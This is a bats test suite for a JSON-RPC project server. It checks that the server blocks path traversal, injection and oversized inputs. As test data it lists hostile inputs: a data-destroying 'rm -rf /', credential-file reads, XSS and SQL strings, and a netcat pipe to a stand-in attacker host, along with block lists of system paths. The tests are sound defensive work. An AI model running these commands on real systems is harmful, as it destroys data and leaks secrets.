#!/usr/bin/env bats
# Security and edge case handling
# Tests for validation, input sanitization, and edge case handling

set -eo pipefail

load 'fixtures/helpers/test-helpers.sh'

create_security_project() {
    cat <<'EOF' >README.md
# The Black Gate
EOF

    cat <<'EOF' >normal.py
print('find the one ring')
EOF

    cat <<'EOF' >.hidden_file
we were good once
EOF

    # Create nested structure for path traversal tests
    mkdir -p "safe/nested/path"
    cat <<'EOF' >"safe/nested/path/file.txt"
mithril armor
EOF

    git add . >/dev/null 2>&1
    git commit -m "the black gate" >/dev/null 2>&1
}

setup() {
    shared_setup
    create_security_project
}

teardown() {
    shared_teardown
}

@test "server blocks path traversal attempts in file operations" {
    local dangerous_patterns=(
        "../../../etc/passwd"
        "/etc/shadow"
        "~/.ssh/id_rsa"
        "..\\\\..\\\\..\\\\windows\\\\system32"
        "\$HOME/.bashrc"
    )

    for pattern in "${dangerous_patterns[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$pattern\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
            true
        elif echo "$output" | jq -e '.result.error' >/dev/null 2>&1; then
            true
        else
            local content
            content=$(echo "$output" | jq -r '.result.content[0].text')
            ! echo "$content" | grep -q "etc/passwd\|etc/shadow\|ssh\|windows\|system32\|bashrc"
        fi
    done
}

@test "file tools handle malicious file type filters safely" {
    # Test with null bytes and path traversal in file types
    run execute_rpc "tools/call" '{"name": "list_project_files", "arguments": {"file_types": ["\u0000/etc/passwd"]}}'
    [ "$status" -eq 0 ]

    validate_jsonrpc_response "$output"

    # Should return error or sanitized results
    if echo "$output" | jq -e '.result.error' >/dev/null 2>&1; then
        # Error response is acceptable
        echo "$output" | jq -e '.result.error' >/dev/null
    else
        # Or valid response with sanitized data
        echo "$output" | jq -e '.result.content[0].text' >/dev/null
        # Should not contain malicious paths
        ! echo "$output" | grep -q "/etc/passwd"
    fi

    # Test with excessive array length
    local long_array='['
    for i in {1..100}; do # Reduced from 1000 to 100 for faster testing
        long_array+='".txt",'
    done
    long_array=${long_array%,}']'

    run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": $long_array}}"
    [ "$status" -eq 0 ]

    validate_jsonrpc_response "$output"
    # Should handle gracefully with error or truncated results
    echo "$output" | jq -e '.result' >/dev/null
}

@test "server validates file extensions according to security policy" {
    # Test dangerous file extensions that should be blocked
    local dangerous_extensions=(
        ".exe"
        ".bat"
        ".cmd"
        ".scr"
        ".vbs"
        ".ps1"
        ".dll"
        ".com"
    )

    for ext in "${dangerous_extensions[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$ext\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        # Check if this is an error response, which is expected for dangerous extensions
        if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
            local error_msg
            error_msg=$(echo "$output" | jq -r '.result.content[0].text')
            echo "$error_msg" | grep -q "not allowed\|Error\|invalid"
        else
            # If not an error, should return empty results for dangerous extensions
            local content
            content=$(echo "$output" | jq -r '.result.content[0].text')
            # Should not find files with dangerous extensions or should indicate no files
            ! echo "$content" | grep -q "found\|files.*$ext" || echo "$content" | grep -q "0 files\|No files"
        fi
    done

    # Test safe extensions that should be allowed
    local safe_extensions=(".py" ".js" ".md" ".json" ".yaml")

    for ext in "${safe_extensions[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$ext\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        # Should handle safe extensions without errors
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]
    done
}

@test "server sanitizes query inputs properly" {
    # Test query sanitization with dangerous patterns
    local dangerous_queries=(
        "<script>alert('xss')</script>"
        "'; DROP TABLE users; --"
        "javascript:alert(1)"
        "data:text/html,<script>alert(1)</script>"
        "file:///etc/passwd"
        "../../../etc/shadow"
    )

    for query in "${dangerous_queries[@]}"; do
        # Test with search_cursor_conversations which uses sanitize_query
        run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$query\"}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        # Should handle dangerous queries safely
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')

        # Should not contain dangerous patterns in response
        ! echo "$content" | grep -q "<script>\|DROP TABLE\|javascript:\|data:\|file://"
    done
}

@test "server validates conversation content security" {
    # Test with get_project_info instead of non-existent add_message
    # This tests parameter validation which is a key security feature
    run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {"include_stats": "<script>alert(\"xss\")</script>"}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should reject malicious parameter or handle gracefully
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "boolean\|invalid\|Error"
    else
        # If accepted, should return valid project info
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$content" | jq -e '.project_name' >/dev/null
    fi
}

@test "server enforces security constants limits" {
    # Test MAX_STRING_LENGTH enforcement ( default is 50000 characters)
    local huge_string
    huge_string=$(printf 'A%.0s' {1..51000}) # Exceed max length

    run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$huge_string\"}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle oversized input gracefully
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "exceed\|too long\|invalid" || true
    else
        # If processed, should be truncated
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]
    fi

    # Test MAX_ARRAY_LENGTH enforcement (default is 100 items)
    local huge_array='['
    for i in {1..101}; do # Exceed max array length
        huge_array+='".txt",'
    done
    huge_array=${huge_array%,}']'

    run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": $huge_array}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle oversized arrays gracefully
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "exceed\|too many\|invalid" || true
    else
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]
    fi
}

@test "server blocks access to restricted system paths" {
    # Test blocked paths from SECURITY_BLOCKED_PATHS
    local blocked_paths=(
        "/etc"
        "/sys"
        "/proc"
        "/dev"
        "/root"
        "/boot"
        "/var/log"
        "/var/run"
        "/tmp"
        "/usr/bin"
        "/usr/sbin"
    )

    for blocked_path in "${blocked_paths[@]}"; do
        # Try to access blocked path via file operations
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$blocked_path/*.txt\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        # Should not access blocked paths
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        ! echo "$content" | grep -q "$blocked_path" || echo "$content" | grep -q "Error\|restricted\|denied"
    done
}

@test "server handles shell metacharacters safely" {
    # Test dangerous shell metacharacters in inputs
    local dangerous_chars=(
        "file.txt; rm -rf /"
        "file.txt && cat /etc/passwd"
        "file.txt | nc attacker.com 1234"
        "file.txt \$(whoami)"
        "file.txt \`id\`"
        "file.txt > /tmp/evil"
    )

    for dangerous_input in "${dangerous_chars[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$dangerous_input\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        # Should handle shell metacharacters safely
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')

        # Should not execute shell commands or contain dangerous output
        ! echo "$content" | grep -q "root:\|uid=\|gid=\|/bin/bash"
    done
}

@test "project tools enforce parameter validation" {
    # Test invalid include_stats parameter
    run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {"include_stats": "invalid"}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should reject invalid parameter type
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "boolean\|invalid\|Error"
    elif echo "$output" | jq -e '.result.error' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.error')
        echo "$error_msg" | grep -q "boolean\|invalid"
    else
        # If accepted, should handle gracefully
        local result_content
        result_content=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$result_content" | jq -e '.project_name' >/dev/null
    fi
}

@test "cursor extraction tools handle invalid parameters safely" {
    # Test invalid summary parameter
    run execute_rpc "tools/call" '{"name": "query_cursor_conversations", "arguments": {"summary": "not_boolean"}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle invalid parameter gracefully
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "boolean\|invalid\|Error" || true
    else
        # If accepted, should return valid data
        local result_content
        result_content=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$result_content" | jq -e '.workspaces' >/dev/null || echo "$result_content" | grep -q "workspaces\|conversations"
    fi
}

@test "server enforces input size limits" {
    # Test extremely long file type filter
    local huge_string
    huge_string=$(printf 'A%.0s' {1..1000}) # 1KB string

    run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$huge_string\"]}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle large input gracefully
    local content
    content=$(echo "$output" | jq -r '.result.content[0].text')
    # Should return empty results or handle gracefully
    echo "$content" | grep -q "0 files\|No files\|empty" || [[ -n "$content" ]]
}

@test "server handles malformed JSON gracefully" {
    local malformed_json='{"invalid": json}'

    local python_exec
    python_exec=$(get_python_executable)
    run bash -c "echo '$malformed_json' | '$python_exec' '$SERVER_DIR/main.py' --project-root '$TEST_PROJECT_DIR' 2>/dev/null"
    [ "$status" -eq 0 ]

    # Server should return error response for malformed JSON
    echo "$output" | while IFS= read -r line; do
        if [[ -n "$line" ]] && echo "$line" | jq -e '.error.code == -32700' >/dev/null 2>&1; then
            exit 0
        fi
    done
}

@test "file operations handle special characters and unicode" {
    # Create files with special characters
    touch "file with spaces.txt"
    touch "file-with-dashes.txt"
    touch "file_with_underscores.txt"
    touch "file.with.dots.txt"
    touch "файл-unicode.txt" 2>/dev/null || true # Cyrillic, because elvish isn't a type yet

    run execute_rpc "tools/call" '{"name": "list_project_files", "arguments": {}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    local content
    content=$(echo "$output" | jq -r '.result.content[0].text')

    # Should handle special characters without errors
    echo "$content" | grep -q "spaces\|dashes\|underscores\|dots" || true
}

@test "server handles concurrent requests safely" {
    # Test concurrent file listing requests
    local pids=()

    for i in {1..5}; do
        (
            execute_rpc "tools/call" '{"name": "list_project_files", "arguments": {}}' >/dev/null
        ) &
        pids+=($!)
    done

    # Wait for all background processes to finish
    for pid in "${pids[@]}"; do
        wait "$pid"
    done

    # All processes should complete without errors
    [ ${#pids[@]} -eq 5 ]
}

@test "project operations handle corrupted git repositories" {
    # Corrupt the git repository
    rm -rf .git/objects/* 2>/dev/null || true

    run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle corrupted git
    local content
    content=$(echo "$output" | jq -r '.result.content[0].text')
    if echo "$content" | jq . >/dev/null 2>&1; then
        # Content is valid JSON, check for project_name and project_root
        echo "$content" | jq -e '.project_name' >/dev/null
        echo "$content" | jq -e '.project_root' >/dev/null
    else
        # Content is not JSON, check if it's a valid text response
        [[ -n "$content" ]] && [[ "$content" != "null" ]]
    fi
}

@test "file operations enforce max_files parameter limits" {
    # Test with very large max_files value
    run execute_rpc "tools/call" '{"name": "list_project_files", "arguments": {"max_files": 999999}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle large limits gracefully
    local content
    content=$(echo "$output" | jq -r '.result.content[0].text')
    [[ -n "$content" ]]

    # Test with negative max_files value
    run execute_rpc "tools/call" '{"name": "list_project_files", "arguments": {"max_files": -1}}'
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle negative values gracefully
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "invalid\|Error" || true
    else
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]
    fi
}

@test "file operations reject directory traversal in all contexts" {
    # Test directory traversal in different parameter contexts
    local traversal_patterns=(
        "../../../etc/passwd"
        "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam"
        "/etc/mordor"
        "/proc/self/environ"
        "\$PWD/../../../etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" # URL encoded hard to read
    )

    for pattern in "${traversal_patterns[@]}"; do
        # Test in file_types parameter
        run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$pattern\"]}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        # Should either error or return safe results
        if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
            true # Good - rejected the dangerous pattern
        else
            local content
            content=$(echo "$output" | jq -r '.result.content[0].text')
            # Should not contain sensitive file contents
            ! echo "$content" | grep -q "root:\|admin:\|password\|secret\|private"
        fi
    done
}

@test "project names are POSIX path-friendly and safe" {
    # Test various project name scenarios that should be handled safely
    local test_projects=(
        "valid-project-name"
        "project_with_underscores"
        "project.with.dots"
        "project123"
        "CamelCaseProject"
        "lowercase-project"
    )

    for project_name in "${test_projects[@]}"; do
        # Create test project with this name
        local test_project="$TEST_HOME/$project_name"
        mkdir -p "$test_project"
        cd "$test_project"

        git init >/dev/null 2>&1
        git config user.email "test@gandalf.test"
        git config user.name "Gandalf Test"
        echo "# Test project with name: $project_name" >README.md
        git add . >/dev/null 2>&1
        git commit -m "Initial commit" >/dev/null 2>&1

        # Test get_project_info with this project name
        run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {}}' "$test_project"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')

        # Project name should match the directory name exactly
        local returned_name
        returned_name=$(echo "$content" | jq -r '.project_name')
        [[ "$returned_name" == "$project_name" ]]
    done
}

@test "project names with problematic characters are handled safely" {
    # Test project names that could cause issues but should be handled safely
    local problematic_projects=(
        "project with spaces"
        "project-with-très-special-chars"
        "project@symbol"
        "project#hash"
        "project%percent"
        "project&ampersand"
    )

    for project_name in "${problematic_projects[@]}"; do
        # Create test project with this name
        local test_project="$TEST_HOME/$project_name"
        mkdir -p "$test_project"
        cd "$test_project"

        git init >/dev/null 2>&1
        git config user.email "test@gandalf.test"
        git config user.name "Gandalf Test"
        echo "# Test project with problematic name: $project_name" >README.md
        git add . >/dev/null 2>&1
        git commit -m "Initial commit" >/dev/null 2>&1

        # Test get_project_info - should handle gracefully
        run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {}}' "$test_project"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')

        # Should return valid project info without crashing
        if echo "$content" | jq . >/dev/null 2>&1; then
            # Content is valid JSON, check for project_name and project_root
            echo "$content" | jq -e '.project_name' >/dev/null
            echo "$content" | jq -e '.project_root' >/dev/null
        else
            # Content is not JSON, check if it's a valid text response
            [[ -n "$content" ]] && [[ "$content" != "null" ]]
        fi
    done
}

@test "dangerous project names are rejected or sanitized" {
    # Test project names that should be rejected or handled carefully
    local dangerous_projects=(
        "../../../etc"
        "../../root"
        "/etc/passwd"
        "~/.ssh"
        "\$HOME/dangerous"
        "project;rm -rf /"
        "project|dangerous"
        "project\`dangerous\`"
        "project\$(dangerous)"
    )

    for project_name in "${dangerous_projects[@]}"; do
        # Attempt to create test project with dangerous name
        local test_project="$TEST_HOME/$project_name"

        # Some of these might fail to create, which is expected
        if mkdir -p "$test_project" 2>/dev/null; then
            cd "$test_project" 2>/dev/null || continue

            git init >/dev/null 2>&1 || continue
            git config user.email "test@gandalf.test" 2>/dev/null || continue
            git config user.name "Gandalf Test" 2>/dev/null || continue
            echo "# Dangerous test" >README.md 2>/dev/null || continue
            git add . >/dev/null 2>&1 || continue
            git commit -m "Dangerous test" >/dev/null 2>&1 || continue

            # Test get_project_info - should handle safely
            run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {}}' "$test_project"
            [ "$status" -eq 0 ]
            validate_jsonrpc_response "$output"

            # Should either work safely or return an error
            if echo "$output" | jq -e '.result.error' >/dev/null 2>&1; then
                # Error is acceptable for dangerous names
                true
            else
                local content
                content=$(echo "$output" | jq -r '.result.content[0].text')

                # If it works, the returned project name should be safe
                local returned_name
                returned_name=$(echo "$content" | jq -r '.project_name')

                # Should not contain dangerous path traversal patterns
                ! echo "$returned_name" | grep -q "\.\./\|/etc/\|/root\|\$HOME\|;\||\|\`\|\$("
            fi
        fi
    done
}

@test "project name consistency across operations" {
    # Test that project names are consistent across different operations
    local test_project="$TEST_HOME/consistency-test-project"
    mkdir -p "$test_project"
    cd "$test_project"

    git init >/dev/null 2>&1
    git config user.email "test@gandalf.test"
    git config user.name "Gandalf Test"
    echo "# Consistency test" >README.md
    git add . >/dev/null 2>&1
    git commit -m "Consistency test" >/dev/null 2>&1

    # Get project info
    run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {}}' "$test_project"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    local project_info_name
    project_info_name=$(echo "$output" | jq -r '.result.content[0].text | fromjson | .project_name')

    # Project name should be consistent
    [[ "$project_info_name" == "consistency-test-project" ]]
}

@test "project name sanitization transparency is exposed correctly" {
    # Test that sanitization transparency fields are correctly set
    local test_cases=(
        "normal-project-name:false"      # Should not be sanitized
        "project_with_underscores:false" # Should not be sanitized
        "valid.project.name:false"       # Should not be sanitized
        "project with spaces:true"       # Should be sanitized
        "project@symbol:true"            # Should be sanitized
        "project#hash:true"              # Should be sanitized
    )

    for test_case in "${test_cases[@]}"; do
        local project_name="${test_case%:*}"
        local should_be_sanitized="${test_case#*:}"

        # Create test project with this name
        local test_project="$TEST_HOME/$project_name"

        # Create the project directory
        mkdir -p "$test_project"
        cd "$test_project"
        git init >/dev/null 2>&1
        git config user.email "test@gandalf.test"
        git config user.name "Gandalf Test"
        echo "# Test project with name: $project_name" >README.md
        git add . >/dev/null 2>&1
        git commit -m "Initial commit" >/dev/null 2>&1

        # Test get_project_info
        run execute_rpc "tools/call" '{"name": "get_project_info", "arguments": {}}' "$test_project"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')

        # Check if sanitization occurred as expected
        local returned_name
        returned_name=$(echo "$content" | jq -r '.project_name')

        if [[ "$should_be_sanitized" == "true" ]]; then
            # Name should be different from original (sanitized)
            [[ "$returned_name" != "$project_name" ]]
        else
            # Name should match original (not sanitized)
            [[ "$returned_name" == "$project_name" ]]
        fi
    done
}

@test "security validation handles conversation content properly" {
    # Test conversation content validation with various inputs
    local test_content=(
        "normal conversation content"
        "conversation with <script>alert('xss')</script>"
        "javascript:alert('malicious')"
        "data:text/html,<script>alert(1)</script>"
        "conversation with template injection"
    )

    for content in "${test_content[@]}"; do
        # Test with conversation query that might use conversation validation
        run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$content\", \"include_content\": true}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        # Should handle all content safely without errors
        local response_content
        response_content=$(echo "$output" | jq -r '.result.content[0].text')

        # Should return valid JSON response
        [[ -n "$response_content" ]]

        # Check if it's a valid response (either conversations or error message)
        if ! echo "$response_content" | grep -q "conversations\|workspaces\|No conversations"; then
            # If not a standard response, should be an error message
            echo "$response_content" | grep -q "Error\|error" || true
        fi
    done
}

@test "server enforces MAX_QUERY_LENGTH for search queries" {
    # Test query length limits (default is 100 characters)
    local short_query="valid query"
    local long_query
    long_query=$(printf 'A%.0s' {1..150}) # Exceed max query length

    # Test with valid short query
    run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$short_query\"}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle short queries without issues
    local content
    content=$(echo "$output" | jq -r '.result.content[0].text')
    [[ -n "$content" ]]

    # Test with oversized query
    run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$long_query\"}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle long queries gracefully (either truncate or error)
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "exceed\|too long\|invalid" || true
    else
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]
    fi
}

@test "server enforces MAX_PATH_DEPTH for path validation" {
    # Test path depth limits (default is 20 levels)
    local deep_path=""
    for i in {1..25}; do # Exceed max path depth
        deep_path+="level$i/"
    done
    deep_path+="file.txt"

    # Test with excessively deep path in file operations
    run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": [\"$deep_path\"]}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle deep paths safely (either reject or sanitize)
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "depth\|deep\|invalid" || true
    else
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        # Should not find files at excessive depth
        echo "$content" | grep -q "0 files\|No files\|empty" || [[ -n "$content" ]]
    fi
}

@test "conversation ID validation works correctly" {
    # Test conversation ID validation patterns
    local valid_queries=(
        "find recent conversations"
        "search for debugging sessions"
        "help with architecture"
        "review code changes"
    )

    local dangerous_queries=(
        "../../dangerous/path"
        "query;with;dangerous;chars"
        "query|with|pipes"
        "query with dangerous content"
    )

    # Test valid queries
    for query in "${valid_queries[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$query\", \"limit\": 1}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        # Should handle valid operations without errors
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]
    done

    # Test with potentially dangerous patterns
    for dangerous_query in "${dangerous_queries[@]}"; do
        run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$dangerous_query\"}}"
        [ "$status" -eq 0 ]
        validate_jsonrpc_response "$output"

        # Should handle dangerous inputs safely - either return safe results or error
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]

        # Should return valid response (conversations, error, or no results)
        if ! echo "$content" | grep -q "conversations\|workspaces\|No conversations"; then
            # If not a standard response, should be an error message
            echo "$content" | grep -q "Error\|error" || true
        fi
    done
}

@test "security constants are properly applied across all validation functions" {
    # Test that all security constants are properly enforced

    # Test SECURITY_MAX_STRING_LENGTH (50000 chars)
    local huge_string
    huge_string=$(printf 'X%.0s' {1..50100}) # Slightly exceed limit

    run execute_rpc "tools/call" "{\"name\": \"search_cursor_conversations\", \"arguments\": {\"query\": \"$huge_string\"}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle large strings gracefully
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        true # Error is acceptable for oversized input
    else
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]
    fi

    # Test SECURITY_MAX_ARRAY_LENGTH (100 items)
    local huge_array='['
    for i in {1..105}; do # Exceed array limit
        huge_array+='".test",'
    done
    huge_array=${huge_array%,}']'

    run execute_rpc "tools/call" "{\"name\": \"list_project_files\", \"arguments\": {\"file_types\": $huge_array}}"
    [ "$status" -eq 0 ]
    validate_jsonrpc_response "$output"

    # Should handle large arrays gracefully
    if echo "$output" | jq -e '.result.isError == true' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$output" | jq -r '.result.content[0].text')
        echo "$error_msg" | grep -q "exceed\|too many\|invalid" || true
    else
        local content
        content=$(echo "$output" | jq -r '.result.content[0].text')
        [[ -n "$content" ]]
    fi
}
